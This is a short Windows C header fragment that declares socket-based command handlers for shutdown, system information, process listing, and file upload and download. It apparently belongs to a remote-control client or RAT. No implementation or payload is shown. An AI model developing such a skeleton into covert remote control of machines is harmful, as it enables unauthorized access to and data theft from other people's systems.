#include "..\shared.h"

#include <tchar.h>
#include <wininet.h>
#include <iphlpapi.h>
#include <Psapi.h>
#include <stdlib.h>

int parseCommand(SOCKET, char* input);
int cmdShutdown();
int cmdInform(SOCKET);
int cmdProc(SOCKET);
int cmdUpload(SOCKET, char* args);
int cmdDownload(SOCKET, char*, char*);

